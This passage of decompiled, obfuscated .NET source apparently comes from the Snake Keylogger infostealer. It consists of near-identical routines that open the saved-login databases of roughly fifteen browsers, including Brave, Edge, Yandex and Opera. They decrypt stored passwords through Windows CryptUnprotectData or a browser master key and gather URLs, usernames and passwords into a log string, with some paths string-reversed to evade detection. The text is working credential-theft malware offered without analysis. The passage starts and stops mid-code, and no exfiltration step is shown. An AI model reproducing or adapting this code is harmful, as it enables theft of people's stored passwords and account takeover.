				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: 360\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _061CӚ_02E8œ_FFFD()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Comodo\\Dragon\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Comodo\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void CЦӓZ_FFFD()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Brave\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ł_FFFD_05C9یٷ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Torch\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Torch\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void i㹃ӺRӺ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\UCBrowser\\User Data_i18n\\Default\\UC Login Data.18";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("wow_logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: UC\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFDεթ_058Fm()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Blisk\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Blisk\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Uj皍ζ_06E8()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Epic Privacy Browser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Epic\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void 鈇ҚBҟǎ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Yandex\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void Ś븤_06E8븤_FFFD()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Nichrome\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Nichrome\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void C_2964_0657_FFFDΩ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Amigo\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Amigo\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void 콪JΑ_FFFDأ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kometa\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Kometa\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void 늻_0097_FFFD_065Aŧ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Xpom\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Xpom\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _0385K_FFFDЅՄ()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Elements Browser\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Elements\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void _FFFD_FFFD_06092_003B()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
		checked
		{
			try
			{
				_0739ߡс_02E8鈟 obj = new _0739ߡс_02E8鈟(text);
				obj.@_FFFDœ_FFFD_FFFD("logins");
				if (!File.Exists(text))
				{
					return;
				}
				int num = obj.іٵ_FFFDՄ_005E() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = obj.یϱ_00AB_FFFDZ(i, "origin_url");
					string text3 = obj.یϱ_00AB_FFFDZ(i, "username_value");
					string text4 = obj.یϱ_00AB_FFFDZ(i, "password_value");
					if (ε_065ACݝ_FFFD(text4))
					{
						byte[] array = _07FBƉ_FFFDջ퓜(Directory.GetParent(text)!.Parent!.FullName);
						if (array != null)
						{
							text4 = ﾭޗӥƌ_F0B9(Encoding.Default.GetBytes(text4), array);
						}
					}
					else
					{
						text4 = œ_06E8_FFFDӛ_FFFD(Encoding.Default.GetBytes(obj.یϱ_00AB_FFFDZ(i, "password_value")));
					}
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						string text5 = "\r\n-------- Snake Keylogger --------\r\nFound From: Edge Chromium\r\nHost: " + text2 + "\r\nUSR: " + text3 + "\r\nPSWD: " + text4 + "\r\n---------------------------------\r\n ";
						鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text5;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, EntryPoint = "CryptUnprotectData", SetLastError = true)]
	private static extern bool _0333թ_02E8O_0327(ref DATA_BLOB _02F3_FFFDœ_FFFDҢ, string ԹUӤ_FFFD恁, ref DATA_BLOB 꼺KOÒã, IntPtr 똛ޤœzc, ref CRYPTPROTECT_PROMPTSTRUCT ZŲ_0739_0609ή, int ŁջߟՕO, ref DATA_BLOB 똛_FFFDӺ_0331ݶ);

	public static string œ_06E8_FFFDӛ_FFFD(byte[] _FFFDJױלɢ)
	{
		DATA_BLOB _02F3_FFFDœ_FFFDҢ = default(DATA_BLOB);
		DATA_BLOB 똛_FFFDӺ_0331ݶ = default(DATA_BLOB);
		GCHandle gCHandle = GCHandle.Alloc(_FFFDJױלɢ, GCHandleType.Pinned);
		_02F3_FFFDœ_FFFDҢ.pbData = gCHandle.AddrOfPinnedObject();
		_02F3_FFFDœ_FFFDҢ.cbData = _FFFDJױלɢ.Length;
		gCHandle.Free();
		DATA_BLOB 꼺KOÒã = default(DATA_BLOB);
		CRYPTPROTECT_PROMPTSTRUCT ZŲ_0739_0609ή = default(CRYPTPROTECT_PROMPTSTRUCT);
		_0333թ_02E8O_0327(ref _02F3_FFFDœ_FFFDҢ, null, ref 꼺KOÒã, default(IntPtr), ref ZŲ_0739_0609ή, 0, ref 똛_FFFDӺ_0331ݶ);
		checked
		{
			byte[] array = new byte[똛_FFFDӺ_0331ݶ.cbData + 1];
			Marshal.Copy(똛_FFFDӺ_0331ݶ.pbData, array, 0, 똛_FFFDӺ_0331ݶ.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	public static void 䇹_FFFD똛_0385Ł()
	{
		if (File.Exists(_02F3ε뫆_0327_005E + Strings.StrReverse("ataD nigoL\\elbatS arepO\\erawtfoS arepO\\")))
		{
			_02F3ε뫆_0327_005E += Strings.StrReverse("ataD nigoL\\elbatS arepO\\erawtfoS arepO\\");
		}
		else if (File.Exists(_02F3ε뫆_0327_005E + Strings.StrReverse("tad.dnaw\\eliforp\\arepO\\arepO\\")))
		{
			_02F3ε뫆_0327_005E += Strings.StrReverse("tad.dnaw\\eliforp\\arepO\\arepO\\");
		}
		try
		{
			object obj = new _0739ߡс_02E8鈟(_02F3ε뫆_0327_005E);
			NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(obj), (Type)null, "ReadTable", new object[1] { Strings.StrReverse("snigol") }, (string[])null, (Type[])null, (bool[])null, true);
			if (!File.Exists(_02F3ε뫆_0327_005E))
			{
				return;
			}
			int num = 0;
			int num2 = Conversions.ToInteger(RuntimeHelpers.GetObjectValue(Operators.SubtractObject(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj), (Type)null, "GetRowCount", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)1)));
			int num3 = num;
			int num4 = num2;
			for (int i = num3; i <= num4; i = checked(i + 1))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(obj);
				Type type = null;
				string text = "GetValue";
				object[] array = new object[2]
				{
					i,
					Strings.StrReverse("lru_nigiro")
				};
				object[] array2 = array;
				string[] array3 = null;
				Type[] array4 = null;
				bool[] array5 = new bool[2] { true, false };
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), type, text, array2, array3, array4, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0])), typeof(int)));
				}
				string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue2));
				object objectValue3 = RuntimeHelpers.GetObjectValue(obj);
				Type type2 = null;
				string text3 = "GetValue";
				object[] array6 = new object[2]
				{
					i,
					Strings.StrReverse("eulav_emanresu")
				};
				object[] array7 = array6;
				string[] array8 = null;
				Type[] array9 = null;
				array5 = new bool[2] { true, false };
				object objectValue4 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), type2, text3, array7, array8, array9, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				string text4 = Conversions.ToString(RuntimeHelpers.GetObjectValue(objectValue4));
				object @default = Encoding.Default;
				Type type3 = null;
				string text5 = "GetBytes";
				object[] array10 = new object[1];
				object[] array11 = array10;
				int num5 = 0;
				object objectValue5 = RuntimeHelpers.GetObjectValue(obj);
				object objectValue6 = RuntimeHelpers.GetObjectValue(objectValue5);
				Type type4 = null;
				string text6 = "GetValue";
				array = new object[2] { i, null };
				object[] array12 = array;
				int num6 = 1;
				string text7 = (string)(array12[num6] = Strings.StrReverse("eulav_drowssap"));
				array6 = array;
				object[] array13 = array6;
				string[] array14 = null;
				Type[] array15 = null;
				array5 = new bool[2] { true, false };
				object objectValue7 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue6), type4, text6, array13, array14, array15, array5));
				if (array5[0])
				{
					i = Conversions.ToInteger(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array6[0])), typeof(int)));
				}
				array11[num5] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue7));
				object[] array16 = array10;
				object[] array17 = array16;
				string[] array18 = null;
				Type[] array19 = null;
				bool[] array20 = new bool[1] { true };
				object objectValue8 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(@default), type3, text5, array17, array18, array19, array20));
				if (array20[0])
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue5), (Type)null, "GetValue", new object[3]
					{
						i,
						text7,
						RuntimeHelpers.GetObjectValue(array16[0])
					}, (string[])null, (Type[])null, true, false);
				}
				string text8 = œ_06E8_FFFDӛ_FFFD((byte[])objectValue8);
				if ((Operators.CompareString(text4, "", false) != 0) & (Operators.CompareString(text8, "", false) != 0))
				{
					string text9 = "\r\n-------- Snake Keylogger --------\r\nFound From: Opera\r\nHost: " + text2 + "\r\nUSR: " + text4 + "\r\nPSWD: " + text8 + "\r\n---------------------------------\r\n ";
					鈟ЮŁ_0327ϒ._FFFDҭӚ_FFFD_FFFD += text9;
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static string չΑ_FFFDŎ_06DA(string _05C1_DB8E_DC9Aױʓ)
	{
		string text = "abcdefghijklmnopqrstuvwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=";
		string text2 = "";
		for (int i = 0; i < _05C1_DB8E_DC9Aױʓ.Length; i = checked(i + 1))
		{
			string text3 = Conversions.ToString(_05C1_DB8E_DC9Aױʓ[i]);
			if (text.Contains(text3.ToLower()))
			{
				text2 += text3;
			}
		}
		return text2;
	}

	public static object _2_0300ҡ_FFFDK(byte[] ē_0097_FFFDӥɛ, byte[] _FFFDŲm_06E8ƌ)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				mD5CryptoServiceProvider.Initialize();
				byte[] array = new byte[OΩʤ_FFFDӛ.Length + (ē_0097_FFFDӥɛ.Length - 1) + 1];
